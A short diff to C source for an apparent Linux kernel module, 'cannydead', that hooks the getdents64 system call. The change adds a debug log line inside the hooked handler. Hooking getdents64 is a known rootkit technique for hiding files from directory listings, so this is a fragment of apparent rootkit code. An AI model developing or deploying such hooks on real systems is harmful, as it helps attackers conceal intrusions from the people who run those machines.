@@ -8,6 +8,7 @@ asmlinkage long (*real_getdents64)(unsigned int, struct linux_dirent64 __user *,
 
 asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
 {
+    printk(KERN_INFO "cannydead: hooked_getdents64 called\n");
     long ret = real_getdents64(fd, dirp, count);
     if (ret <= 0)
         return ret;
